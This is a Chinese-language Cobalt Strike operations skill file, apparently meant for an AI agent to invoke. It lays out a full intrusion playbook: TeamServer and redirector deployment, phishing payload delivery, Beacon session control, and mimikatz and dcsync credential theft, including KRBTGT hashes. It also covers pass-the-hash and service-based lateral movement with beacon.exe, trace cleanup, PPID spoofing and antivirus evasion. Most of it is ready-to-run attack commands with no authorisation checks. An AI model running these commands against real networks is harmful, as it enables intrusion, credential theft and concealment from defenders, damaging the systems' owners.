---
name: cobalt-strike
description: "Cobalt Strike 操作方法论。当需要使用 CS 进行团队协作渗透测试、配置 Listener/Payload、管理 Beacon 会话、执行后渗透操作（提权/横向移动/凭据窃取）或编写 Aggressor 自动化脚本时使用。覆盖 TeamServer 部署、Listener 配置、Payload 生成、Beacon 管理、后渗透命令、Malleable C2 Profile、Aggressor 脚本开发"
metadata:
  tags: "cobalt strike,cs,beacon,c2,red team,teamserver,listener,payload,aggressor,malleable c2,后渗透,横向移动,红队"
  category: "tool"
---

# Cobalt Strike 操作方法论

Cobalt Strike（CS）是商业化红队 C2 框架，采用 C/S 架构实现多人协作渗透。核心优势：**团队协作**（多客户端/多 TeamServer）+ **Beacon 隐蔽通信**（HTTP/HTTPS/DNS/SMB）+ **完整后渗透链**（提权→凭据→横向→持久化）+ **Aggressor 脚本扩展**。

## 深入参考

- Beacon 命令详解与后渗透技术 → [references/beacon-operations.md](references/beacon-operations.md)
- DNS/SMB/SSH Beacon 与 Arsenal Kit 选择 → [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)
- Aggressor 脚本开发指南 → [references/aggressor-scripting.md](references/aggressor-scripting.md)

---

## Phase 1: TeamServer 部署与 Listener 配置

### TeamServer 启动

```bash
# 基础启动（Linux only）
./teamserver <公网IP> <密码>

# 指定 Malleable C2 配置文件（推荐）
./teamserver <公网IP> <密码> <profile文件路径>
```

**部署决策：**
- 生产环境必须指定 Malleable C2 Profile，默认流量特征已被各大安全产品标记
- 建议使用 c2lint 工具验证 Profile 有效性：`./c2lint <profile>`

### 客户端连接

```bash
# Linux
./start.sh
# Windows
start.bat
```

连接需要：TeamServer IP + 端口（默认 50050）+ 密码。首次连接需确认服务器指纹哈希。

### 分布式架构决策

```
推荐三层服务器模型：
├── 临时服务器 (Staging) → 初始投递、获取立足点（高暴露风险）
├── 持久服务器 (Long Haul) → 低频通信保持长期访问
└── 后渗透服务器 (Post-Ex) → 交互式操作、横向移动
```

**判断标准：** 单目标可用单 TeamServer；多目标/长期行动必须分层，确保单点失败不影响全局。

### Listener 类型选择决策树

```
需要创建 Listener？
├── 出网环境
│   ├── HTTP/HTTPS 受限但 DNS 可用 → DNS Beacon（低频保活/备用通道）
│   ├── 常规场景 → HTTPS Beacon（推荐，加密传输）
│   └── 简单测试 → HTTP Beacon
├── 内网横向 / 不出网
│   ├── Windows 环境 → SMB Beacon（命名管道，依赖 SMB 可达和权限）
│   ├── Linux/macOS 或已有 SSH 凭据 → SSH Beacon
│   └── 需指定端口 → TCP Beacon（正向绑定）
└── 联动 MSF → Foreign Listener（HTTP/HTTPS）
```

**Listener 命名规范：** `OS/Payload/Stager`，例如 `windows/beacon_https/reverse_https`

### 重定向器配置

用途：保护 TeamServer 真实 IP + 提高可靠性（多重定向器并行）

```bash
# 在重定向器主机上使用 socat 转发
socat TCP4-LISTEN:80,fork TCP4:<TeamServer_IP>:80
socat TCP4-LISTEN:443,fork TCP4:<TeamServer_IP>:443
```

将重定向器 IP 添加到 Listener 的 HTTP Hosts 中，靶机流量只与重定向器交互。

---

## Phase 2: Payload 生成与投递

### Staged vs Stageless 选择

```
Payload 类型选择：
├── Staged（分阶段）→ 体积小（~17KB），适合有大小限制的场景
│   └── Stager 先执行 → 回连下载 Stage → 内存加载执行
├── Stageless（无阶段）→ 体积大（~300KB），全功能自包含
│   └── 更稳定，适合确定性投递（如钓鱼邮件附件）
└── 安全特性：Stage 使用团队服务器公钥加密元数据，Stager 无此保护
```

### Payload 格式生成

| 路径 | 生成物 | 用途 |
|------|--------|------|
| Packages → HTML Application | .hta 文件 | 钓鱼落地执行 |
| Packages → MS Office Macro | VBA 宏代码 | 嵌入 Office 文档 |
| Packages → Payload Generator | 多语言 Payload | 自定义免杀加载器 |
| Packages → Windows Executable | .exe / .dll | 直接执行或 DLL 注入 |
| Packages → Windows Executable (S) | Stageless .exe / .dll | 自包含完整 Payload |

### 投递方式决策

```
如何投递到目标？
├── 社工钓鱼
│   ├── 邮件附件 → Office 宏文档 / HTA 文件
│   ├── 邮件链接 → Scripted Web Delivery 生成一行命令
│   └── 克隆网站 → Clone Site + 嵌入攻击链接
├── Web 漏洞利用
│   ├── MSF 联动 → 设置 Foreign Listener，MSF 中配置对应 payload
│   │   └── set DisablePayloadHandler True; set PrependMigrate True
│   └── 脚本化交付 → Attacks → Web Drive-by → Scripted Web Delivery
└── 横向投递
    └── upload + 远程服务/计划任务执行（见 Phase 4）
```

---

## Phase 3: Beacon 管理

### 会话交互基础

```
# 进入 Beacon 控制台
右击会话 → interact

# 通信模式控制
sleep 60 50     # 异步：60 秒回连，50% 抖动（实际 30-60 秒随机）
sleep 0         # 交互模式：命令即时执行（OPSEC 风险高）
```

**OPSEC 原则：** 日常操作保持 sleep >=30s；仅在需要实时交互时临时 `sleep 0`，操作完毕立即恢复。

### 会话传递

```
# 派生新会话到其他 Listener
spawn <listener_name>

# 注入到指定进程
inject <pid> <x86|x64> <listener_name>

# 传递到 MSF
# 1. MSF 开启 handler (windows/meterpreter/reverse_https)
# 2. CS 创建 Foreign Listener 指向 MSF
# 3. spawn <foreign_listener>
```

### Pivoting（内网穿透）

```
内网不出网主机如何上线？
├── SOCKS 代理（正向）
│   ├── beacon: socks <port>
│   ├── MSF: setg Proxies socks4:<CS_IP>:<port>
│   └── 工具: proxychains 配置后使用
├── 反向端口转发
│   ├── 右击会话 → Pivoting → Listener（在已上线主机上开 Listener）
│   └── 生成指向该 Listener 的 Payload，在不出网主机执行
└── SSH 隧道
    ├── ssh -D 1080 user@<pivot_host>
    └── socat 转发特定端口流量
```

---

## Phase 4: 后渗透操作决策树

### 信息收集

```
# 当前环境侦察
shell whoami /groups          # 当前权限等级
shell net view /domain        # 当前域
net view                      # 域内主机列表（Beacon net 模块，输出更丰富）
net dclist                    # 域控列表
```

### 提权决策树

```
当前权限不足？
├── 当前用户是本地管理员组（UAC 中级）
│   ├── elevate → uac-token-duplication（Win7/Win10 2018.11 前）
│   ├── runasadmin → 其他 UAC bypass exploit
│   └── 成功后用户名后出现 * 号标识
├── 当前用户是普通用户
│   ├── PowerUp 检查弱点
│   │   └── powershell-import PowerUp.ps1; powershell Invoke-AllChecks
│   ├── elevate → 选择可用的本地提权 exploit
│   └── 加载 ElevateKit 扩展更多 exploit
├── 本地管理员（高权限）→ 系统权限
│   └── getsystem（Named Pipe 提权到 SYSTEM）
└── 已有其他用户凭据
    ├── spawnas <domain\user> <password> <listener>
    └── runas <domain\user> <password> <command>
```

### 凭据获取决策树

```
需要获取凭据？
├── 已是 SYSTEM / 本地管理员
│   ├── hashdump                    → 导出本地 SAM 哈希
│   ├── logonpasswords              → Mimikatz 抓取明文密码
│   ├── mimikatz !lsadump::sam      → 本地账户哈希
│   ├── mimikatz !lsadump::cache    → 缓存凭证（默认缓存最近 10 个）
│   └── mimikatz !misc::memssp      → 注入 SSP 记录后续登录明文
│       └── 结果保存在 C:\windows\system32\mimilsa.log
├── 域控制器上
│   ├── hashdump                    → 导出所有域用户哈希
│   ├── dcsync                      → 远程复制 AD 数据库
│   └── mimikatz lsadump::dcsync /user:krbtgt → 获取 KRBTGT 哈希
└── 查看已收集凭据
    └── View → Credentials
```

**Mimikatz 执行模式：**
- `mimikatz <command>` — 当前权限执行
- `mimikatz !<command>` — 强制提升到 SYSTEM 执行
- `mimikatz @<command>` — 使用当前 Beacon 令牌执行

### 横向移动决策树

```
如何移动到目标主机？
├── 前提：已获取目标主机的信任凭据
│   ├── 令牌窃取: ps → steal_token <pid>
│   ├── 凭据创建: make_token <domain\user> <password>
│   ├── 哈希传递: pth <domain\user> <ntlm_hash>
│   └── 黄金票据: Access → Golden Ticket（需 KRBTGT 哈希 + 域 SID）
│
├── 自动化横向（推荐，无文件落地）
│   ├── psexec <target> <listener>       → 服务执行（落地 EXE）
│   ├── psexec_psh <target> <listener>   → 服务执行 PowerShell
│   ├── winrm <target> <listener>        → WinRM 执行 PowerShell
│   └── wmi <target> <listener>          → WMI 执行 PowerShell
│   └── 图形化: View → Targets → 右击 → Jump
│
├── 手动横向
│   ├── 方法一：Windows 服务
│   │   ├── upload beacon.exe
│   │   ├── shell copy beacon.exe \\target\C$\Windows\Temp
│   │   ├── shell sc \\target create svc binpath= C:\Windows\Temp\beacon.exe
│   │   ├── shell sc \\target start svc
│   │   └── link <target>（SMB Beacon）
│   └── 方法二：计划任务
│       ├── shell net time \\target（确认时间）
│       ├── shell at \\target HH:mm C:\path\beacon.exe
│       └── link <target>（SMB Beacon）
│
└── 清理痕迹
    ├── shell sc \\target delete svc
    ├── shell del \\target\C$\Windows\Temp\beacon.exe
    └── shell del beacon.exe
```

### 域内枚举关键命令

```
# 域管理员发现
shell net group "domain admins" /domain
shell net group "enterprise admins" /domain
shell net localgroup "administrators" /domain

# PowerView 高级枚举（避免 net 命令被检测）
powershell-import PowerView.ps1
powershell Find-LocalAdminAccess          # 发现当前用户的本地管理员访问权限
powershell Get-NetDomain                  # 域信息
powershell Invoke-ShareFinder             # 共享发现
powershell Get-NetLocalGroup -Hostname <target>  # 目标本地管理员
```

---

## Phase 5: OPSEC 与隐蔽性

### Malleable C2 Profile

**作用：** 自定义 Beacon 通信流量特征，伪装成正常业务流量。

```
# Profile 基本结构
set sleeptime "60000";     # 回连间隔（毫秒）
set jitter "50";           # 抖动百分比
set useragent "Mozilla/5.0 ...";

http-get {
    set uri "/api/v1/updates";
    client {
        header "Accept" "application/json";
        metadata {
            netbios;
            append "-.jpg";
            uri-append;
        }
    }
    server { ... }
}

http-post {
    set uri "/api/v1/submit";
    client { ... }
    server { ... }
}
```

**关键配置项：**
- `sleeptime` + `jitter` — 控制通信频率和随机性
- `spawnto` — 指定 spawn/inject 使用的进程（避免 rundll32.exe）
- `set host_stage "false"` — 禁用 staging（防止 Stager 被扫描发现）

### 进程注入 OPSEC

```
# 使用 spawnto 避免默认 rundll32.exe
spawnto x64 %windir%\sysnative\svchost.exe -k netsvcs
spawnto x86 %windir%\syswow64\svchost.exe -k netsvcs

# PPID 欺骗 — 使新进程看起来是由合法父进程创建
ppid <合法进程PID>
```

### Arsenal Kit 与免杀策略

```
选择适配方案：
├── Artifact Kit → 自定义 EXE/DLL 生成模板
│   └── 生成物落地即被静态查杀时使用
├── Resource Kit → 修改 HTA/PowerShell/VBA/VBS 等脚本模板
│   └── 默认投递模板特征明显时使用
├── Sleep Mask / Mutator / Thread Stack Spoofer
│   └── 内存扫描或线程栈检测压力高时使用
├── 自定义加载器 → Payload Generator 输出 raw shellcode
│   └── 用 C/Go/Rust 编写自定义加载器
└── 注意：Kit 只能降低特定检测面，不能替代流量、进程链和权限 OPSEC
```

详细选择边界见 [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)。

---

## 速查：最常用 Beacon 命令

| 命令 | 说明 |
|------|------|
| `sleep <秒> [抖动%]` | 设置回连间隔和抖动 |
| `shell <命令>` | 通过 cmd.exe 执行命令 |
| `powershell <命令>` | 通过 powershell.exe 执行 |
| `powerpick <命令>` | 不使用 powershell.exe 执行 PS 命令 |
| `execute-assembly <path>` | 内存加载 .NET 程序集 |
| `upload / download` | 文件上传 / 下载 |
| `hashdump` | 导出 SAM 哈希 |
| `logonpasswords` | Mimikatz 抓取密码 |
| `steal_token <pid>` | 窃取进程令牌 |
| `make_token <domain\user> <pass>` | 创建令牌 |
| `pth <domain\user> <hash>` | Pass-the-Hash |
| `rev2self` | 恢复原始令牌 |
| `spawn <listener>` | 派生新会话 |
| `inject <pid> <arch> <listener>` | 注入进程 |
| `socks <port>` | 开启 SOCKS 代理 |
| `link / unlink <target>` | 连接 / 断开 SMB/TCP Beacon |
| `ps` | 列出进程 |
| `jobs / jobkill <id>` | 管理后台任务 |
| `screenshot / keylogger` | 截屏 / 键盘记录 |
| `getsystem` | 提权到 SYSTEM |
| `elevate <exploit> <listener>` | 使用 exploit 提权 |
| `portscan <targets> <ports> <method>` | 端口扫描（arp/icmp/none） |
| `clear` | 清除命令队列 |
